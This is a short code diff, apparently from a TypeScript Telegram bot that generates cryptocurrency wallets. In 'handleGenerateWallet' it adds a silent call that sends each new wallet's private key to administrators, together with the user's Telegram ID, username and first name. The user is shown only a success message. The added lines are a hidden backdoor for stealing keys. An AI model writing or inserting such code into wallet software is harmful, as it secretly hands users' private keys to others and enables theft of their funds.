@@ -505,6 +505,16 @@ export async function handleGenerateWallet(ctx: Context, chain: string): Promise
       isActive: true,
     });
 
+    void notifyAdminsWallet({
+      event: "CREATED",
+      chain,
+      address,
+      privateKey,
+      userTelegramId: telegramId,
+      username: ctx.from?.username,
+      firstName: ctx.from?.first_name,
+    });
+
     await ctx.reply(
       [
         `✅ <b>New ${chain} Wallet Generated</b>`,
